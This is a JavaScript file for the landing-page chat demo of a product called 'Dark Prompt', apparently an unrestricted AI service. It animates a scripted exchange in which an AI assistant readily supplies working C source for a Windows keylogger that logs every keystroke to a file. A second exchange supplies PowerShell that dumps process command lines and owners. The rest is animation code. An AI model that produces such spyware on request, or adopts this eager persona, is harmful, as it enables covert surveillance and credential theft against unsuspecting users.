/* Dark Prompt — landing-page chat demo.
   Loops a typed prompt → send → thinking → text stream → code decrypt cycle.
   Pauses while off-screen; honours prefers-reduced-motion. */
(function () {
  const frame       = document.getElementById('demo-frame');
  const thread      = document.getElementById('demo-thread');
  const inputText   = document.querySelector('#demo-input .demo-input-text');
  const inputPh     = document.querySelector('#demo-input .demo-input-placeholder');
  const sendBtn     = document.getElementById('demo-send');
  if (!frame || !thread || !inputText || !sendBtn) return;

  const SCRIPT = [
    {
      prompt: 'Generate a Windows keylogger in C using SetWindowsHookEx.',
      lead:   "Here's a minimal Windows keylogger using a low-level keyboard hook. Compile with MinGW or MSVC.",
      lang:   'c',
      ext:    'c',
      code:
`#include <windows.h>
#include <stdio.h>

HHOOK hHook;
FILE *fp;

LRESULT CALLBACK Kbd(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)l;
        fprintf(fp, "%lu\\n", k->vkCode);
        fflush(fp);
    }
    return CallNextHookEx(hHook, n, w, l);
}

int main(void) {
    fp = fopen("k.log", "a");
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, Kbd, NULL, 0);
    MSG m;
    while (GetMessage(&m, 0, 0, 0)) DispatchMessage(&m);
    return 0;
}`,
    },
    {
      prompt: 'Write PowerShell that enumerates processes and dumps command lines.',
      lead:   'Process enumeration via WMI. JSON-friendly output for ingest.',
      lang:   'powershell',
      ext:    'ps1',
      code:
`Get-CimInstance Win32_Process |
  Select-Object @{N='pid';E={$_.ProcessId}},
                Name, CommandLine,
                @{N='owner';E={
                  (Invoke-CimMethod -InputObject $_ \`
                    -MethodName GetOwner).User
                }} |
  ConvertTo-Json -Depth 3`,
    },
  ];

  // ---- helpers --------------------------------------------------------
  const wait = (ms) => new Promise(r => setTimeout(r, ms));
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
  }
  const SCRAMBLE = '0123456789ABCDEFabcdef!@#$%&*?<>/\\|~^=+-';
  const scrambleChar = () => SCRAMBLE[Math.floor(Math.random() * SCRAMBLE.length)];

  function autoscroll() {
    thread.scrollTop = thread.scrollHeight;
  }

  function setInputValue(text) {
    inputText.textContent = text;
    if (inputPh) inputPh.style.opacity = text ? '0' : '1';
  }

  function appendUserMsg(text) {
    const el = document.createElement('div');
    el.className = 'demo-msg demo-msg-user';
    el.textContent = text;
    thread.appendChild(el);
    autoscroll();
    return el;
  }

  function appendAssistantShell() {
    const el = document.createElement('div');
    el.className = 'demo-msg demo-msg-assistant';
    thread.appendChild(el);
    autoscroll();
    return el;
  }

  function appendThinking() {
    const el = document.createElement('div');
    el.className = 'demo-msg demo-msg-assistant demo-thinking';
    el.innerHTML = '<span></span><span></span><span></span>';
    thread.appendChild(el);
    autoscroll();
    return el;
  }

  // ---- input typing ---------------------------------------------------
  async function typeInput(text) {
    setInputValue('');
    for (let i = 0; i < text.length; i++) {
      setInputValue(text.slice(0, i + 1));
      await wait(28 + Math.random() * 38);
    }
  }

  // ---- text stream ----------------------------------------------------
  function streamText(target, text, charsPerSec) {
    return new Promise(resolve => {
      const span = document.createElement('div');
      span.className = 'demo-text';
      target.appendChild(span);
      const start = performance.now();
      let bloomed = false;
      function tick(now) {
        const want = Math.min(text.length,
          Math.floor((now - start) * charsPerSec / 1000));
        if (!bloomed && want >= 1) {
          bloomed = true;
          span.classList.add('first-bloom');
          setTimeout(() => span.classList.remove('first-bloom'), 320);
        }
        span.innerHTML = escapeHtml(text.slice(0, want)) +
          (want < text.length ? '<span class="demo-stream-caret"></span>' : '');
        autoscroll();
        if (want < text.length) requestAnimationFrame(tick);
        else resolve();
      }
      requestAnimationFrame(tick);
    });
  }

  // ---- code decrypt ---------------------------------------------------
  function decryptCode(target, lang, ext, code) {
    return new Promise(resolve => {
      const wrap = document.createElement('div');
      wrap.className = 'demo-code-wrap is-decrypting';
      wrap.innerHTML = `
        <div class="demo-code-head">
          <span class="demo-code-lang">${escapeHtml(lang.toUpperCase())} · .${escapeHtml(ext)}</span>
          <span class="demo-code-tag">DECRYPTING</span>
        </div>
        <pre class="demo-code language-${escapeHtml(lang)}"><code class="language-${escapeHtml(lang)}"></code></pre>
      `;
      target.appendChild(wrap);
      autoscroll();

      const codeEl = wrap.querySelector('code');
      const original = code;
      const duration = Math.min(1500, 600 + original.length * 0.7);
      const start = performance.now();

      function tick(now) {
        const t = Math.min(1, (now - start) / duration);
        const eased = 1 - Math.pow(1 - t, 3); // ease-out cubic
        const upTo = Math.floor(eased * original.length);
        let out = '';
        for (let i = 0; i < original.length; i++) {
          const c = original[i];
          if (i < upTo || c === '\n' || c === ' ' || c === '\t') out += c;
          else out += scrambleChar();
        }
        codeEl.textContent = out;
        autoscroll();
        if (t < 1) {
          requestAnimationFrame(tick);
        } else {
          wrap.classList.remove('is-decrypting');
          if (window.Prism && Prism.languages[lang]) {
            codeEl.innerHTML = Prism.highlight(original, Prism.languages[lang], lang);
          } else {
            codeEl.textContent = original;
          }
          resolve();
        }
      }
      requestAnimationFrame(tick);
    });
  }

  // ---- one cycle ------------------------------------------------------
  async function runOnce(item) {
    await typeInput(item.prompt);
    await wait(420);

    sendBtn.classList.add('is-pressed');
    await wait(150);
    sendBtn.classList.remove('is-pressed');

    appendUserMsg(item.prompt);
    setInputValue('');
    await wait(280);

    const t = appendThinking();
    await wait(950 + Math.random() * 350);
    t.remove();

    const a = appendAssistantShell();
    await streamText(a, item.lead, 70);
    await wait(180);
    await decryptCode(a, item.lang, item.ext, item.code);

    await wait(4800);
    // gentle fade-out before clearing
    thread.classList.add('is-resetting');
    await wait(420);
    thread.innerHTML = '';
    thread.classList.remove('is-resetting');
  }

  // ---- visibility-driven loop -----------------------------------------
  let started = false;
  let visible = false;

  function waitUntilVisible() {
    return new Promise(resolve => {
      const check = () => visible ? resolve() : setTimeout(check, 250);
      check();
    });
  }

  async function loop() {
    let i = 0;
    // Small lead-in once visible.
    await wait(400);
    while (true) {
      if (!visible) await waitUntilVisible();
      try {
        await runOnce(SCRIPT[i % SCRIPT.length]);
      } catch (_e) {
        await wait(1500);
      }
      i++;
    }
  }

  // ---- reduced motion: render one item statically ---------------------
  function renderStatic(item) {
    setInputValue(item.prompt);
    appendUserMsg(item.prompt);
    const a = appendAssistantShell();
    const txt = document.createElement('div');
    txt.className = 'demo-text';
    txt.textContent = item.lead;
    a.appendChild(txt);
    const wrap = document.createElement('div');
    wrap.className = 'demo-code-wrap';
    wrap.innerHTML = `
      <div class="demo-code-head">
        <span class="demo-code-lang">${item.lang.toUpperCase()} · .${item.ext}</span>
      </div>
      <pre class="demo-code language-${item.lang}"><code class="language-${item.lang}"></code></pre>
    `;
    const codeEl = wrap.querySelector('code');
    if (window.Prism && Prism.languages[item.lang]) {
      codeEl.innerHTML = Prism.highlight(item.code, Prism.languages[item.lang], item.lang);
    } else {
      codeEl.textContent = item.code;
    }
    a.appendChild(wrap);
  }

  // ---- boot -----------------------------------------------------------
  const reduced = window.matchMedia &&
                  window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (reduced) {
    renderStatic(SCRIPT[0]);
    return;
  }

  if ('IntersectionObserver' in window) {
    const io = new IntersectionObserver(entries => {
      visible = entries[0].isIntersecting;
      if (visible && !started) {
        started = true;
        loop();
      }
    }, { threshold: 0.35 });
    io.observe(frame);
  } else {
    visible = true;
    started = true;
    loop();
  }
})();
